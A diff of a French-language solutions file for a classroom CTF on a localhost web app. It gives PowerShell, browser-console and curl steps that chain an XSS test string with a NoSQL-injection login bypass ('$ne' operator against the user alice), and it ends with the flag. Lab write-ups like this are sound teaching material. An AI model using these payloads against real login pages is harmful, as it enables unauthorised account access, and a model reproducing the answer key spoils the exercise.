@@ -1,75 +1,158 @@
-# 1) Seed
-Set-Location "c:\Users\yarno\OneDrive\Bureau\Stage CTF\CTF - Vol 404"
+# CTF Vol 404 - Solutions
+
+Ce document donne deux parcours complets:
+
+1. Parcours A: terminal PowerShell (rapide pour corriger et verifier)
+2. Parcours B: navigateur (plus pedagogique pour les etudiants)
+
+---
+
+## Prerequis
+
+1. L'app est lancee sur http://localhost:3000
+2. MongoDB est disponible (Docker compose ou local)
+3. Le seed a ete execute
+
+Commandes utiles:
+
+```powershell
+docker compose up -d --build
 npm run seed
+```
 
-# 2) Vérif manifest
+---
+
+## Parcours A - Solution PowerShell complete
+
+### 1) Verifier les passagers
+
+```powershell
 (Invoke-RestMethod -Uri 'http://localhost:3000/billets/passengers').Count
+```
 
-# 3) Session d’attaque (XSS puis NoSQL)
+### 2) Creer une session HTTP (cookies)
+
+```powershell
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+```
 
-$xss = @{ username = "<img src=x onerror=alert(1)>"; password = "wrong" } | ConvertTo-Json -Depth 4
+### 3) Condition XSS (premiere etape)
+
+```powershell
+$xss = @{ username = '<img src=x onerror=alert(1)>'; password = 'wrong' } | ConvertTo-Json -Depth 4
 try {
   Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $xss
 } catch {}
+```
 
-$nosql = @{ username = "alice"; password = @{ '$ne' = '' } } | ConvertTo-Json -Depth 4
+### 4) Condition NoSQL (deuxieme etape)
+
+```powershell
+$nosql = @{ username = 'alice'; password = @{ '$ne' = '' } } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $nosql
+```
 
-# 4) Logs admin (doit marcher après XSS+NoSQL)
+### 5) Verifier les logs admin
+
+```powershell
 Invoke-RestMethod -Uri 'http://localhost:3000/auth/logs' -WebSession $session
+```
 
-# 5) Billet + QR (obligatoire)
+### 6) Charger le billet (QR obligatoire)
+
+```powershell
 $ticket = Invoke-RestMethod -Uri 'http://localhost:3000/billets/my' -WebSession $session
 $ticket | Format-List
-
-# 6) Scanner le QR depuis billet.html avec un téléphone (étape obligatoire)
-# Le QR ouvre /gate/scan/<scanId> sur le téléphone ET declenche l'ouverture auto sur PC vers /gate/scan-result/<scanId>.
-
-# 7) Soumettre le code département final
-$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
-$flag
-
-
-# 8) résultat : CTF{ORY_boarding_complete}
-
-
-## Solution via le site (navigateur)
-
-1. Ouvre http://localhost:3000
-2. Affiche le code source de la page (Ctrl+U) et repere la route cachee passengers.html
-3. Va sur http://localhost:3000/passengers.html pour identifier la cible alice
-4. Va sur http://localhost:3000/login.html
-5. Dans le formulaire, teste une XSS pour valider la premiere condition :
-
-```text
-username = <img src=x onerror=alert(1)>
-password = nimportequoi
 ```
 
-6. Pour la NoSQL (deuxieme condition), depuis DevTools Console sur la page login, envoie :
+Important:
 
-```javascript
-fetch('/auth/login', {
-  method: 'POST',
+1. Le QR doit etre scanne depuis `billet.html`
+2. Le scan ouvre `/gate/scan/<scanId>` sur le telephone
+3. Le PC est redirige automatiquement vers `/gate/scan-result/<scanId>`
 
-7. Verifie les logs admin dans le navigateur :
-
-```text
-http://localhost:3000/auth/logs
-```
-
-8. Ouvre http://localhost:3000/billet.html pour recuperer le billet.
-9. Scan du QR obligatoire: le téléphone ouvre le JSON gate et le PC est redirige automatiquement vers le gate.
-10. IMPORTANT : la page gate JSON n'est pas le flag. Elle donne seulement l'indice final (code 94).
-11. Pour recuperer le flag en PowerShell, execute exactement :
+### 7) Soumettre le code final
 
 ```powershell
 $flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
 $flag
 ```
 
-12. Alternative sans terminal (DevTools Console) :
+Resultat attendu:
+
+```text
+CTF{ORY_boarding_complete}
+```
+
+---
+
+
+
+
+
+
+## Parcours B - Solution navigateur (sans PowerShell)
+
+### 1) Reperer la cible
+
+1. Ouvrir http://localhost:3000
+2. Afficher le code source (Ctrl+U)
+3. Trouver la route cachee `passengers.html`
+4. Ouvrir http://localhost:3000/passengers.html
+5. Identifier la cible `alice`
+
+### 2) Valider la condition XSS
+
+1. Ouvrir http://localhost:3000/login.html
+2. Tester dans le formulaire:
+
+```text
+username = <img src=x onerror=alert(1)>
+password = nimportequoi
+```
+
+### 3) Valider la condition NoSQL (DevTools)
+
+Dans la console navigateur sur `login.html`:
+
+```javascript
+fetch('/auth/login', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  credentials: 'include',
+  body: JSON.stringify({
+    username: 'alice',
+    password: { $ne: '' }
+  })
+})
+  .then(r => r.json())
+  .then(console.log);
+```
+
+### 4) Verifier les logs admin
+
+Ouvrir:
+
+```text
+http://localhost:3000/auth/logs
+```
+
+### 5) Etape QR obligatoire
+
+1. Ouvrir http://localhost:3000/billet.html
+2. Scanner le QR avec le telephone
+3. Le telephone ouvre le JSON gate
+4. Le PC est redirige automatiquement vers le gate JSON
+
+Le JSON gate ressemble a:
+
+```json
+{"gate":"B7","flightCode":"AF404","message":"RVN","hint":"QTH Locator : JN03EL","indice":"La cle survole la banlieue parisienne..."}
+```
+
+### 6) Envoyer le code final depuis le navigateur
+
+Dans DevTools Console:
 
 ```javascript
 fetch('/flag', {
@@ -77,7 +160,35 @@ fetch('/flag', {
   headers: { 'Content-Type': 'application/json' },
   credentials: 'include',
   body: JSON.stringify({ code: 94 })
-}).then(r => r.json()).then(console.log)
+})
+  .then(r => r.json())
+  .then(console.log);
 ```
 
-13. Flag attendu : CTF{ORY_boarding_complete}
+
+Postman possible 
+
+Curl possible : 
+
+curl -c cookies.txt -H "Content-Type: application/json" \
+  -d "{\"username\":\"alice\",\"password\":{\"$ne\":\"\"}}" \
+  http://localhost:3000/auth/login
+
+curl -b cookies.txt -H "Content-Type: application/json" \
+  -d "{\"code\":94}" \
+  http://localhost:3000/flag
+
+Resultat attendu:
+
+```text
+CTF{ORY_boarding_complete}
+```
+
+---
+
+## Notes prof (anti blocage rapide)
+
+1. Si le scan ouvre `localhost` sur telephone: verifier `PUBLIC_BASE_URL` dans `.env`
+2. Si le telephone ne charge pas l'URL LAN: verifier meme Wi-Fi + firewall Windows port 3000
+3. Si le QR ne debloque pas le PC: recharger `billet.html` pour regenerer un QR (nouveau `scanId`)
+4. Si la session expire: refaire login puis reprendre a l'etape billet
